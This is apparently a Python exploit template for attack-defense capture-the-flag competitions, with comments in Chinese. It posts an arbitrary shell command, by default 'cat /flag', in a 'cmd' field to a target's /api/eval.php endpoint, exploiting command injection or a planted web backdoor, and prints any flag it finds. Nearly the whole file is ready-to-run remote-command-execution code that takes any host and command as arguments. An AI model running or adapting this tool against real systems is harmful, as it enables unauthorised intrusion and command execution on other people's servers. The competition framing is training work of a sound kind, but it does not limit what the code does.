#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
AWD-Red 标准 PoC 示例模板 1: Web 命令执行 (RCE) / 后门暗桩利用
契约规范:
1. 接收 sys.argv[1] 作为目标 IP (可能带端口如 192.168.1.101:8080)
2. 接收 sys.argv[2] 作为动态取旗命令 (默认从环境变量 GET_FLAG_CMD 读取)
3. 设置合理的网络超时 (建议 2.0s 内)
4. 将捕获的 Flag 完整输出到 stdout
"""

import sys
import os
import urllib.request
import urllib.parse
import re

DEFAULT_FLAG_CMD = "cat /flag"
TIMEOUT = 2.0

def exploit(target: str, flag_cmd: str):
    # 处理 host 与 port
    if ":" in target:
        host, port = target.split(":", 1)
    else:
        host, port = target, "80"

    # 构造攻击 URL (示例: 常见的命令注入或一句话后门)
    url = f"http://{host}:{port}/api/eval.php"
    
    # 构造 Payload
    payload_data = urllib.parse.urlencode({
        "cmd": flag_cmd
    }).encode("utf-8")

    req = urllib.request.Request(
        url,
        data=payload_data,
        headers={
            "User-Agent": "Mozilla/5.0 (AWD-Red Automation Exploit Engine)",
            "Content-Type": "application/x-www-form-urlencoded"
        }
    )

    try:
        with urllib.request.urlopen(req, timeout=TIMEOUT) as resp:
            content = resp.read().decode("utf-8", errors="ignore")
            # 匹配 Flag (默认正则: flag{...})
            match = re.search(r'(?:flag|FLAG)\{[a-zA-Z0-9_\-+=/]{6,128}\}', content)
            if match:
                print(match.group(0))
                return True
            # 如果靶机直接返回 flag 文本
            if "flag" in content.lower():
                print(content.strip())
                return True
    except Exception:
        pass
    return False

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <target_ip[:port]> [flag_cmd]")
        sys.exit(1)

    target_ip = sys.argv[1]
    cmd = sys.argv[2] if len(sys.argv) > 2 else os.environ.get("GET_FLAG_CMD", DEFAULT_FLAG_CMD)
    
    success = exploit(target_ip, cmd)
    sys.exit(0 if success else 1)
